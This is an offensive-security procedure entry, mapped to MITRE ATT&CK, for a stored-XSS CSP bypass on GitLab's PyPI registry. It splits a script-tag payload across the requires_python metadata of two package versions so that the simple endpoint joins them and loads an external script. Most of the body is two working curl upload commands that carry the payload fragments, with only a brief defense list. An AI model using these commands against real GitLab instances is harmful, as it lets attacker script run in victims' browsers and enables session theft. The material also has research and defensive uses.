---
id: proc-multi-version-csp-bypass-856836
tags:
  - xss
  - csp-bypass
  - multi-version
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/upload-pypi-version1-bypass]]'
  - '[[commands/upload-pypi-version2-bypass]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-13T23:52:20.966Z'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Drive-by Compromise]]'
---
# Upload-Multi-Version-Packages-for-CSP-Bypass

## Summary

This procedure uploads multiple versions of the same PyPi package to GitLab, splitting the XSS payload across versions to concatenate on the simple endpoint and bypass CSP by loading an external script.

## Description

GitLab's simple endpoint lists all versions, concatenating their requires_python values in HTML. By splitting '<script src=/path/to/test.js>' across version 1 and closing in version 2, the full tag forms despite CSP blocking inline scripts, allowing external JS load.

## Requirements

1. Existing project and dummy file
2. Token with write permissions
3. External script hosted (e.g., test.js at /vakzz-h1/public/-/raw/a/test.js)

## Defense

Defensive measures and detection strategies:

- Limit package versions or validate metadata per version
- CSP with external script restrictions (e.g., nonce or hash)
- Detect rapid multi-version uploads in logs

## Objectives

1. Split payload to evade single-field sanitization
2. Concatenate to form complete script tag
3. Enable external JS execution bypassing CSP

## Instructions

### Step 1: Upload Version 1 with Opening Payload

**Context**: Inject the opening part of the script tag to start the src attribute.

**Command** ([[commands/upload-pypi-version1-bypass]]):
```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_csp_bypass' -F requires_python='"><script src=/vakzz-h1/public/-/raw/a/test.js>'
```

> Success: 201 response.

### Step 2: Upload Version 2 with Closing Payload

**Context**: Close the script tag to complete the injection.

**Command** ([[commands/upload-pypi-version2-bypass]]):
```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=2 -F name='package_csp_bypass' -F requires_python=' </script>'
```

> Success: 201 response. Endpoint now concatenates to full <script>.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used

- [[commands/upload-pypi-version1-bypass]]
- [[commands/upload-pypi-version2-bypass]]

## Tools Used

- [[tools/curl]]

## Tags

- [[xss]]
- [[csp-bypass]]
- [[multi-version]]
